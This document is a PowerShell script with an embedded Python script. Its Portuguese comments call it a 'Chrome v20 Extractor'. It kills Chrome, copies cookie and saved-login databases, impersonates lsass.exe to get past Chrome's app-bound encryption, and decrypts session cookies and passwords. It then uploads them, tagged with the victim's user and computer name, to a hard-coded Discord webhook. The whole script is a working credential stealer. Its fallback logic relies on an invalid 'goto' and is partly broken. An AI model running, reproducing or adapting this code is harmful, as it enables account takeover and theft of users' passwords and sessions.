param($w = "https://discord.com/api/webhooks/1357835768596664413/gcTW4MU5WYMD_2tAxPFZBlw2T2SU31eXqbAjGYk_ZLiKCUj5-0lC8Dulq4v4Exct_Bc9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

l "=== Chrome v20 Extractor (runassu method) ==="
l "User: $env:USERNAME@$env:COMPUTERNAME"

# Verifica se é admin (necessário para impersonate lsass)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (!$isAdmin) {
    l "[AVISO] NAO esta rodando como ADMINISTRADOR!"
    l "[AVISO] O metodo runassu requer admin para impersonate lsass.exe"
    l "[*] Tentando mesmo assim..."
}

# Verifica se tem Python
$python = Get-Command python -ErrorAction SilentlyContinue
if (!$python) {
    l "[PYTHON] Python nao encontrado! Tentando python3..."
    $python = Get-Command python3 -ErrorAction SilentlyContinue
}
if (!$python) {
    l "[PYTHON] Python nao esta instalado!"
    l "[*] Tentando metodo alternativo..."
    
    # Fallback para o método anterior de extrair chave do elevation_service
    goto fallback
}

l "[PYTHON] Python encontrado: $($python.Source)"

# Mata Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# ============================================
# PASSO 1: Baixar o script Python do runassu + dependências
# ============================================
$scriptDir = "$env:TEMP\chrome_v20_decrypt"
if (Test-Path $scriptDir) { Remove-Item $scriptDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null

l "[DOWNLOAD] Baixando script decrypt do runassu..."

# Baixa o script principal
$scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/main/decrypt_chrome_v20_cookie.py"
$scriptPath = "$scriptDir\decrypt_chrome_v20_cookie.py"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($scriptUrl, $scriptPath)
    $wc.Dispose()
    l "[DOWNLOAD] Script baixado com sucesso"
} catch {
    l "[DOWNLOAD] Falha ao baixar: $_"
    l "[*] Tentando criar script manualmente..."
    
    # Se não conseguir baixar, criamos um script Python equivalente manualmente
    # (mas vamos tentar de novo com mirror diferente primeiro)
    try {
        $scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/refs/heads/main/decrypt_chrome_v20_cookie.py"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($scriptUrl, $scriptPath)
        $wc.Dispose()
        l "[DOWNLOAD] Sucesso na segunda tentativa"
    } catch {
        l "[DOWNLOAD] Todas as tentativas falharam"
        l "[*] Pulando para metodo fallback..."
        goto fallback
    }
}

# ============================================
# PASSO 2: Instalar dependências Python
# ============================================
l "[PIP] Instalando dependencias Python..."

$deps = @("windows", "cryptography", "pywin32", "pycryptodome")
foreach ($dep in $deps) {
    l "[PIP] Instalando $dep..."
    try {
        $output = & $python -m pip install $dep -q 2>&1
        if ($LASTEXITCODE -ne 0) {
            l "[PIP] Erro ao instalar $dep, tentando --user..."
            $output = & $python -m pip install $dep -q --user 2>&1
        }
        l "[PIP] $dep instalado"
    } catch {
        l "[PIP] Falha ao instalar $dep: $_"
    }
}

# ============================================
# PASSO 3: Copiar bancos de dados para evitar lock
# ============================================
l "[COPY] Copiando bancos de dados do Chrome..."

$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$tempDbDir = "$scriptDir\databases"
New-Item -ItemType Directory -Path $tempDbDir -Force | Out-Null

# Copia Local State
$localStateSrc = "$chromeUserData\Local State"
$localStateDst = "$tempDbDir\Local State"
if (Test-Path $localStateSrc) {
    Copy-Item $localStateSrc $localStateDst -Force
    l "[COPY] Local State copiado"
}

# Copia cookies de todos os perfis
$profiles = @('Default','Profile 1','Profile 2','Profile 3','Profile 4')
foreach ($prof in $profiles) {
    $cookieSrc = "$chromeUserData\$prof\Network\Cookies"
    $cookieSrc2 = "$chromeUserData\$prof\Cookies"
    $dstDir = "$tempDbDir\$prof"
    New-Item -ItemType Directory -Path $dstDir -Force -ErrorAction SilentlyContinue
    
    if (Test-Path $cookieSrc) {
        Copy-Item $cookieSrc "$dstDir\Cookies" -Force
        l "[COPY] Cookies de $prof (Network)"
    } elseif (Test-Path $cookieSrc2) {
        Copy-Item $cookieSrc2 "$dstDir\Cookies" -Force
        l "[COPY] Cookies de $prof (raiz)"
    }
    
    # Copia Login Data também
    $loginSrc = "$chromeUserData\$prof\Login Data"
    if (Test-Path $loginSrc) {
        Copy-Item $loginSrc "$dstDir\Login Data" -Force
        l "[COPY] Login Data de $prof"
    }
}

# ============================================
# PASSO 4: Executar o script Python
# ============================================
l "[EXEC] Executando decrypt_chrome_v20_cookie.py..."
Push-Location $scriptDir

try {
    # Executa o script Python e captura output
    $output = & $python $scriptPath 2>&1
    $exitCode = $LASTEXITCODE
    
    l "[EXEC] Exit code: $exitCode"
    
    if ($output -is [array]) {
        foreach ($line in $output) { 
            if ($line -and $line.Length -gt 0) {
                l "[PYTHON] $line"
            }
        }
    } else {
        l "[PYTHON] $output"
    }
    
    # Verifica se o script gerou arquivos de saída
    $resultFiles = Get-ChildItem $scriptDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
    $allCookies = @()
    $allLogins = @()
    
    # Tenta parsear o output para extrair cookies
    if ($output -is [array]) {
        foreach ($line in $output) {
            if ($line -match '^([^\s]+)\s+([^\s]+)\s+(.+)$') {
                $allCookies += @{ host = $matches[1]; name = $matches[2]; value = $matches[3] }
            }
        }
    }
    
    # Se o script não retornou nada, tenta um script próprio que integra tudo
    if ($allCookies.Count -eq 0 -and $resultFiles.Count -eq 0) {
        l "[EXEC] Script original nao retornou dados. Executando script integrado..."
        
        # Cria um script Python integrado que faz tudo + envia pro Discord
        $integratedScript = @'
import os, json, base64, sqlite3, shutil, tempfile, ctypes, struct, io, pathlib
from contextlib import contextmanager

try:
    import windows
    import windows.crypto
    import windows.generated_def as gdef
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
except:
    print("DEPENDENCIAS_FALTANDO")
    exit(1)

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data):
    buffer = io.BytesIO(blob_data)
    parsed = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed['chrome_path'] = buffer.read(header_len).decode('utf-16-le', errors='replace')
    parsed['flag'] = struct.unpack('<B', buffer.read(1))[0]
    parsed['iv'] = buffer.read(12)
    parsed['ciphertext'] = buffer.read(32)
    parsed['tag'] = buffer.read(16)
    remaining = buffer.read()
    if remaining:
        parsed['encrypted_aes_key'] = remaining
    return parsed

def derive_v20_master_key(parsed_data):
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)
        return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)
        return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = windows.crypto.dpapi.unprotect(parsed_data['encrypted_aes_key'])
        xored_aes_key = bytes(a ^ b for a, b in zip(decrypted_aes_key, xor_key))
        cipher = AESGCM(xored_aes_key)
        return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)

def decrypt_cookie_value(encrypted_value, master_key):
    if encrypted_value[:3] == b"v20":
        cookie_iv = encrypted_value[3:15]
        encrypted_cookie = encrypted_value[15:-16]
        cookie_tag = encrypted_value[-16:]
        cipher = AESGCM(master_key)
        decrypted = cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
        return decrypted[32:].decode('utf-8', errors='replace')
    elif encrypted_value[:3] == b"v11":
        cookie_iv = encrypted_value[3:15]
        encrypted_cookie = encrypted_value[15:-16]
        cookie_tag = encrypted_value[-16:]
        cipher = AESGCM(master_key)
        decrypted = cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
        return decrypted.decode('utf-8', errors='replace')
    elif encrypted_value[:3] == b"v10":
        try:
            import win32crypt
            decrypted = win32crypt.CryptUnprotectData(encrypted_value[3:], None, None, None, 0)
            return decrypted[1].decode('utf-8', errors='replace')
        except:
            return None
    return None

def main():
    if not is_admin():
        print("NEEDS_ADMIN")
        return
    
    user_profile = os.environ['USERPROFILE']
    local_state_path = os.path.join(script_dir, "databases", "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    app_bound_key_b64 = local_state["os_crypt"]["app_bound_encrypted_key"]
    app_bound_key = base64.b64decode(app_bound_key_b64)
    assert app_bound_key[:4] == b"APPB", "Formato APPB nao encontrado"
    key_blob_encrypted = app_bound_key[4:]
    
    print("STEP1: SYSTEM DPAPI decrypt...")
    with impersonate_lsass():
        key_blob_system = windows.crypto.dpapi.unprotect(key_blob_encrypted)
    print("STEP2: User DPAPI decrypt...")
    key_blob_user = windows.crypto.dpapi.unprotect(key_blob_system)
    print("STEP3: Parse key blob...")
    parsed = parse_key_blob(key_blob_user)
    print(f"STEP4: Flag={parsed['flag']}, Chrome path={parsed['chrome_path'][:30]}...")
    master_key = derive_v20_master_key(parsed)
    
    all_cookies = []
    all_logins = []
    
    for profile in ['Default', 'Profile 1', 'Profile 2']:
        db_dir = os.path.join(script_dir, "databases", profile)
        cookie_path = os.path.join(db_dir, "Cookies")
        login_path = os.path.join(db_dir, "Login Data")
        
        if os.path.exists(cookie_path):
            try:
                con = sqlite3.connect(cookie_path + "?mode=ro", uri=True)
                cur = con.cursor()
                rows = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, is_secure, is_httponly FROM cookies").fetchall()
                con.close()
                
                for row in rows:
                    enc_val = row[2]
                    if enc_val and len(enc_val) > 3:
                        decrypted = decrypt_cookie_value(enc_val, master_key)
                        if decrypted:
                            all_cookies.append({
                                "host": row[0], "name": row[1], "value": decrypted,
                                "path": row[3], "secure": bool(row[4]), "httponly": bool(row[5])
                            })
                print(f"Profile {profile}: {len(all_cookies)} cookies")
            except Exception as e:
                print(f"Error cookies {profile}: {e}")
        
        if os.path.exists(login_path):
            try:
                con = sqlite3.connect(login_path + "?mode=ro", uri=True)
                cur = con.cursor()
                rows = cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins").fetchall()
                con.close()
                
                for row in rows:
                    enc_val = row[2]
                    if enc_val and len(enc_val) > 3:
                        decrypted = decrypt_cookie_value(enc_val, master_key)
                        if decrypted:
                            all_logins.append({
                                "url": row[0], "username": row[1], "password": decrypted
                            })
                print(f"Profile {profile}: {len(all_logins)} logins")
            except Exception as e:
                print(f"Error logins {profile}: {e}")
    
    # Salva resultados
    with open(os.path.join(script_dir, "cookies.json"), "w", encoding="utf-8") as f:
        json.dump(all_cookies, f, indent=2, ensure_ascii=False)
    with open(os.path.join(script_dir, "logins.json"), "w", encoding="utf-8") as f:
        json.dump(all_logins, f, indent=2, ensure_ascii=False)
    with open(os.path.join(script_dir, "master_key.txt"), "w", encoding="utf-8") as f:
        f.write(master_key.hex())
    
    print(f"RESULT: {len(all_cookies)} cookies, {len(all_logins)} logins")

script_dir = r"''' + $scriptDir + '''"
main()
'@
        
        $integratedPath = "$scriptDir\integrated_decrypt.py"
        $integratedScript | Out-File $integratedPath -Encoding UTF8
        
        $output2 = & $python $integratedPath 2>&1
        $exitCode2 = $LASTEXITCODE
        
        if ($output2 -is [array]) {
            foreach ($line in $output2) { 
                if ($line -and $line.Length -gt 0) {
                    l "[PYTHON2] $line"
                }
            }
        } else {
            l "[PYTHON2] $output2"
        }
    }
    
} catch {
    l "[EXEC] Exception: $_"
}

Pop-Location

# ============================================
# PASSO 5: Coletar resultados e enviar
# ============================================
l "[RESULT] Coletando resultados..."

$allCookies = @()
$allLogins = @()
$masterKeyHex = ""

# Tenta ler dos arquivos JSON gerados
$cookiesFile = Join-Path $scriptDir "cookies.json"
$loginsFile = Join-Path $scriptDir "logins.json"
$keyFile = Join-Path $scriptDir "master_key.txt"

if (Test-Path $cookiesFile) {
    try {
        $allCookies = Get-Content $cookiesFile -Raw | ConvertFrom-Json
        l "[RESULT] Cookies lidos: $($allCookies.Count)"
    } catch { l "[RESULT] Erro lendo cookies.json: $_" }
}

if (Test-Path $loginsFile) {
    try {
        $allLogins = Get-Content $loginsFile -Raw | ConvertFrom-Json
        l "[RESULT] Logins lidos: $($allLogins.Count)"
    } catch { l "[RESULT] Erro lendo logins.json: $_" }
}

if (Test-Path $keyFile) {
    $masterKeyHex = Get-Content $keyFile -Raw
    l "[RESULT] Chave mestra: $($masterKeyHex.Substring(0, [Math]::Min(16, $masterKeyHex.Length)))..."
}

# Envia pro Discord
if ($allCookies.Count -gt 0 -or $allLogins.Count -gt 0) {
    $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
    $body = @()
    $body += "--$boundary"
    $body += 'Content-Disposition: form-data; name="payload_json"'
    $body += ""
    $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allCookies.Count + ' | Logins: ' + $allLogins.Count + ' | Key: ' + $masterKeyHex.Substring(0, [Math]::Min(16, $masterKeyHex.Length)) + '..."}')
    
    if ($allCookies.Count -gt 0) {
        $cc = ($allCookies | ConvertTo-Json -Depth 3)
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $cc
    }
    
    if ($allLogins.Count -gt 0) {
        $lc = ($allLogins | ConvertTo-Json -Depth 3)
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="logins.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $lc
    }
    
    $body += "--$boundary--"
    
    $bodyStr = $body -join "`r`n"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[DISCORD] Dados enviados com sucesso!"
    } catch { l "[FALHA] Discord: $_" }
    
    # Salva local
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    Copy-Item $cookiesFile (Join-Path $out "cookies.json") -Force -ErrorAction SilentlyContinue
    Copy-Item $loginsFile (Join-Path $out "logins.json") -Force -ErrorAction SilentlyContinue
    Copy-Item $keyFile (Join-Path $out "master_key.txt") -Force -ErrorAction SilentlyContinue
    l "[SALVO] Resultados em $out"
} else {
    l "[FALHA] Nenhum dado extraido"
    
    # Fallback: salvar os bancos brutos
    l "[*] Salvando bancos brutos para analise offline..."
    $out = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    
    if (Test-Path $tempDbDir) {
        Copy-Item "$tempDbDir\*" $out -Recurse -Force -ErrorAction SilentlyContinue
        l "[SALVO] Bancos copiados para $out"
    }
}

# Cleanup
if (Test-Path $scriptDir) { Remove-Item $scriptDir -Recurse -Force -ErrorAction SilentlyContinue }

l "=== CONCLUIDO ==="
exit

# Fallback label
function fallback {
    l "[FALLBACK] Metodo alternativo..."
    
    # Tenta extrair chave direto do elevation_service.exe
    $elevPaths = @("$env:ProgramFiles\Google\Chrome\Application\*\elevation_service.exe","${env:ProgramFiles(x86)}\Google\Chrome\Application\*\elevation_service.exe")
    $elevFile = $null
    foreach ($pattern in $elevPaths) { $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending; if ($files) { $elevFile = $files[0]; break } }
    
    if ($elevFile) {
        l "[FALLBACK] elevation_service.exe encontrado em $($elevFile.FullName)"
        $bytes = [System.IO.File]::ReadAllBytes($elevFile.FullName)
        
        $knownKeys = @(
            @(0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87),
            @(0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60),
            @(0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18)
        )
        
        $foundKey = $null
        foreach ($key in $knownKeys) {
            $keyArray = [byte[]]$key
            for ($i = 0; $i -le $bytes.Length - 32; $i++) {
                $match = $true
                for ($j = 0; $j -lt 32; $j++) { if ($bytes[$i+$j] -ne $keyArray[$j]) { $match = $false; break } }
                if ($match) { $foundKey = $keyArray; break }
            }
            if ($foundKey) { break }
        }
        
        if ($foundKey) {
            l "[FALLBACK] Chave AES encontrada! $([System.BitConverter]::ToString($foundKey).Replace('-',''))"
            
            # Tenta decriptar app_bound_encrypted_key
            $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $ak = $json.os_crypt.app_bound_encrypted_key
            
            if ($ak) {
                $raw = [Convert]::FromBase64String($ak)
                $payload = $raw[4..($raw.Length-1)]  # Remove APPB header
                
                # Tenta DPAPI + AES
                try {
                    $dpapiResult = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    l "[FALLBACK] DPAPI result: $($dpapiResult.Length) bytes"
                    
                    # Parse do resultado DPAPI
                    if ($dpapiResult.Length -gt 61) {
                        $pathLen = [System.BitConverter]::ToInt32($dpapiResult[0..3], 0)
                        $flagOffset = 4 + $pathLen
                        $flag = $dpapiResult[$flagOffset]
                        $iv = $dpapiResult[($flagOffset+1)..($flagOffset+12)]
                        $ct = $dpapiResult[($flagOffset+13)..($flagOffset+44)]
                        $tag = $dpapiResult[($flagOffset+45)..($flagOffset+60)]
                        
                        l "[FALLBACK] Flag=$flag IV=$([System.BitConverter]::ToString($iv).Replace('-',''))"
                        
                        try {
                            $aes = [System.Security.Cryptography.AesGcm]::new([byte[]]$foundKey, 16)
                            $dec = [byte[]]::new(32)
                            $aes.Decrypt($iv, $ct, $tag, $dec)
                            $aes.Dispose()
                            l "[FALLBACK] AES-GCM OK! Chave: $([System.BitConverter]::ToString($dec).Replace('-','').Substring(0,16))..."
                            
                            # Agora descriptografa cookies com essa chave
                            # ... (mesmo código de decrypt anterior)
                        } catch { l "[FALLBACK] AES falhou: $_" }
                    }
                } catch { l "[FALLBACK] DPAPI falhou: $_" }
            }
        }
    }
    
    l "[FALLBACK] Metodo alternativo concluido (pode nao ter funcionado)"
}
